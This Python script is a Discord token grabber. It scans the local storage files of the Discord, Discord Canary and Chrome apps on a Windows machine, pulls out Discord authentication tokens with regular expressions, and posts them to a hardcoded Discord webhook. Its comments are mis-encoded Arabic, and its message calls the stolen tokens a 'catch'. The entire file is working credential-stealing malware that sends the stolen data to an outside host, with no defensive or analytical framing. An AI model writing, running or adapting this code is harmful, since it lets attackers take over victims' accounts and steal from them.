import os
import re
import json
import requests

# Ø±Ø§Ø¨Ø· Ø§Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ù…Ù† Ø³ÙŠØ±ÙØ± Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
WEBHOOK_URL = "https://discord.com/api/webhooks/1471162724955197572/uFF2WqlnimEonaTwlVSRk9-mF-8Ysbym8FkPSXmrnVUQJWgN_9TwWpOo_scRXzNw1qRe"

def grab_tokens():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    
    # Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª Ø§Ù„ØªÙŠ ÙŠØ®Ø²Ù† ÙÙŠÙ‡Ø§ ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¹Ù„Ù‰ Ø§Ù„Ø¨ÙŠ Ø³ÙŠ
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canery': roaming + '\\discordcanary',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default'
    }

    tokens = []
    for platform, path in paths.items():
        path += '\\Local Storage\\leveldb'
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token not in tokens:
                                tokens.append(token)
    
    # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ù„Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
    if tokens:
        requests.post(WEBHOOK_URL, json={
            "content": "ğŸ¯ **ØµÙŠØ¯Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø¯Ø§Ø®Ù„ Ù…Ù„ÙØ§Øª Ø§Ù„Ø¨ÙŠ Ø³ÙŠ!**",
            "embeds": [{
                "title": "PC Files Grabber",
                "description": f"ğŸ”‘ **Tokens Found:**\n" + "\n".join([f"`{t}`" for t in tokens]),
                "color": 16711765
            }]
        })

if __name__ == "__main__":
    grab_tokens()
